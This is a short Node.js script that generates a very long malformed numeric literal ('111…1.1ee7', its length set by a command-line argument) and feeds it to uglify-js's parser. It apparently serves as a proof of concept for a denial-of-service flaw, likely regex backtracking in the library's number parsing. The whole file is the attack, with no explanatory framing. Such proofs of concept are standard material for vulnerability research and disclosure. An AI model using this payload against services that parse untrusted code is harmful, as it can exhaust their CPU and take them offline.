var u = require('uglify-js');
var genstr = function (len, chr) {
 	var result = ""; 
 	for (i=0; i<=len; i++) {
 	 result = result + chr; 
 	}
	return result;
}


u.parse("var a = " + genstr(process.argv[2], "1") + ".1ee7;");
